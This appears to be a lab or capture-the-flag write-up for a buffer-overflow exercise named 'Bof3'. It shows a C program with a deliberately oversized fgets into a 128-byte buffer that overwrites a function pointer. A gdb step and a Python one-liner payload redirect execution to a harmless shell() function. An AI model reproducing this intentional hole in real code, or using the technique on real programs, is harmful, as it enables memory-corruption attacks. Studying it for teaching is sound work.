# Bof3
### Program code:
```
#include <stdio.h>
#include <stdlib.h>
#include <sys/types.h>
#include <unistd.h>

void shell() {
    printf("You made it! The shell() function is executed\n");
}

void sup() {
    printf("Congrat!\n");
}

void main()
{ 
    int var;
    void (*func)()=sup;
    char buf[128];
    fgets(buf,133,stdin);
    func();
}
```
>Goal: print out the text "You made it! The shell() function is executed" using *shell()*
### Solution:
1. Get the address of *shell()*:
   - Load the program into *gdb* and type `disas shell`
     
     ![](img/bof3/shell.jpg)
     
   - The first line show us the address of *shell()* which is `0x0804845b`
2. Do the attack:
   - To overflow the memory, we need to input *128 random bytes* + *4 byte address of shell()*
   - Quit *gdb* and type `echo $(python -c "print('a'*128 + '\x5b\x84\x04\x08')") | ./bof3.o`
     
     ![](img/bof3/attackbof3.jpg)
     
   - Goal achieved!
